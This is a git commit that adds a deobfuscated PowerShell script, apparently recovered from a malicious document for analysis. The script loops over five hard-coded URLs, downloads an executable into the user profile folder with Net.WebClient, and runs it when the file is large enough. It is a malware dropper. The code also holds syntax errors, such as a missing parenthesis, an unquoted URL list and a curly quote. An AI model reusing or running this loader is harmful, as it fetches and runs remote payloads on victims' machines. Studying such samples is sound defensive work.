ce8b6a4b2807e1abe376f6d3bcee42ac68d93301
mattx00 <58653523+mattx00@users.noreply.github.com>
2024-09-23 20:23:59 +0200

    Create Codice_Deoffuscato.ps1

---
+++ Documento Malevolo/Codice_Deoffuscato.ps1
@@ -0,0 +1,29 @@
+$Omijwskvux= 'Ppftfyzimmnl';
+$Rotibjkhm = '656';
+$Wogbiqdmgnn = 'Idskatdsvqej';
+$Pbtwxdmsy = $env:userprofile + '\' + $Rotibjkhm + '.exe';
+$Zbzxspcng = 'Iemdzfrrfziud';
+$Izpxphloxri = &('new-object') Net.Webclient;
+$Flafqzpcbm = 
+[
+  http://jasaundanganonline.com/create_sitemap/xhzlg-yhct7-22183398/,
+  https://blogbattalionelite.com/wp-admin/npbvs8q-hw9h7u1k-5188/,
+  https://agenta.airosgroup.com/app/xmt6ku5-plq8-53219773/,
+  https://digitsols.com/margaritadsg.com/OJSqDOw/,		
+  https://smartoria.it/nk8b72hr2/JGFMIieDk/,			
+]
+$Dxbybrvjekhqv=‘Vxeororpwknr';
+foreach($Aucfazyxri in $Flafqzpcbm) {
+	try {
+		$Izpxphloxri."DownloadFile"($Aucfazyxri, $Pbtwxdmsy);
+		$Qhwmulfli = 'Nvhsrpva';
+		If ((&('GetItem') $Pbtwxdmsy)."length" -ge 30582 {	
+			[Diagnostics.Process]::"start"($Pbtwxdmsy);
+			$Potjmheooa='Ncldbfmj';
+break;
+			$Kesjwevrrtcf = 'Tkzxhuydy'
+		}
+	}
+	catch{}
+}
+$Qgluubvwxeor = 'Zsxjvyikdk'
